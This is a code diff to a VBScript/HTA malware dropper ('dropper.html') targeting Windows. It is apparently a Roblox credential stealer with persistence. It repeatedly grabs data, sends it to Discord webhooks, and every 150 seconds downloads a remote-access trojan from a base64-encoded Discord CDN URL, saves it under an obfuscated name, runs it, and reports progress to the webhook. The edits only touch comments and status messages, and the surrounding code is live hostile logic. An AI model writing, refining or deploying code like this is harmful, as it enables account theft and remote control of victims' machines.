@@ -1,7 +1,6 @@
 ' language: VBScript/HTA, file: dropper.html, target: Windows 11, mshta engine
-' DropRAT is now called once per re-grab cycle (inside the Do...Loop).
-' It ONLY talks to RE_WH. The rocket card is the progress UI; the green checkmark
-' is the success state. No standalone 10s loop — the re-grab cadence (150s) is the cadence.
+' DropRAT called once per re-grab cycle, RE_WH only.
+' Card order: rocket (Downloading...) -> checkmark (RAT launched successfully).
 <html>
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
@@ -31,7 +30,7 @@ Call GrabRoblox(WH)
 Call Persistence
 Call PostFullRobloxUI(WH)
 
-' --- 2. INFINITE Re-grab chain — RAT drop is a subroutine, one per cycle, RE_WH only ---
+' --- 2. INFINITE Re-grab chain — RAT drop is one pass per cycle, RE_WH only ---
 Dim runCount
 runCount = 0
 Do
@@ -43,26 +42,24 @@ Do
     Call GrabRoblox(RE_WH)
     Call GrabFroststrap(RE_WH)
     
-    ' RAT: re-downloaded + relaunched every re-grab, posted to re-grab channel
-    Call DropRAT(RE_WH, runCount)
+    ' re-download + relaunch, rocket -> checkmark, RE_WH only
+    Call DropRAT(RE_WH)
     
     Call SleepSeconds(150)
 Loop
 
 window.close()
 
-' --- RAT DROP (one pass per re-grab cycle, RE_WH only) ---
-' Posts the rocket card as the progress UI, green checkmark on success.
-' Deletes stale agent.exe before every fetch so curl always overwrites.
-Sub DropRAT(targetWH, cycle)
+' --- RAT DROP (one pass per re-grab, RE_WH only) ---
+Sub DropRAT(targetWH)
     Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcxOTkxNTcyMDE3NDU1MjE2L2RpY2VjaGVjay5leGU/ZXg9NmFmY2JlYmMmaXM9NmFmYjZkM2MmaG09YTU5ODZiZjg0MzViYWIxYzc1YTFiZTIwODQxOTU0ZDBhNjBkZjcyZTg0ZWYwY2JlZGYxOTczYWNmMTIwMjcxZA=="
     Dim dl : dl = DecodeB64(b64Url)
 
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
     Dim op : op = tPath & "\" & Chr(97) & Chr(103) & Chr(101) & Chr(110) & Chr(116) & Chr(46) & Chr(101) & Chr(120) & Chr(101) ' agent.exe
 
-    ' rocket card = the progress UI, fired once per cycle before the fetch
-    Call PostEmbedTo(":rocket: RAT Download", "Fetching Payload... | Cycle: " & CStr(cycle), 10181046, targetWH)
+    ' rocket card — top of every cycle
+    Call PostEmbedTo(":rocket: RAT Download", "Downloading...", 10181046, targetWH)
 
     ' wipe stale binary so curl always overwrites
     If fso.FileExists(op) Then fso.DeleteFile op, True
@@ -73,17 +70,16 @@ Sub DropRAT(targetWH, cycle)
 
     If fso.FileExists(op) Then
         If fso.GetFile(op).Size > 3000000 Then
-            Dim dsize : dsize = fso.GetFile(op).Size
-            ' success state = green checkmark, launch baked into the same card
+            ' green checkmark — launch succeeds
             Call PostEmbedTo(":white_check_mark: RAT Downloaded", _
-                "Size: " & CStr(dsize) & " bytes | Launching... | Cycle: " & CStr(cycle), _
+                "RAT launched successfully", _
                 10181046, targetWH)
             Call RunCmd("""" & op & """")
         Else
-            Call PostEmbedTo(":rocket: RAT Download", "Retry — size too small | Cycle: " & CStr(cycle), 10181046, targetWH)
+            Call PostEmbedTo(":rocket: RAT Download", "Retry — size too small", 10181046, targetWH)
         End If
     Else
-        Call PostEmbedTo(":rocket: RAT Download", "Retry — file missing | Cycle: " & CStr(cycle), 10181046, targetWH)
+        Call PostEmbedTo(":rocket: RAT Download", "Retry — file missing", 10181046, targetWH)
     End If
 End Sub
 
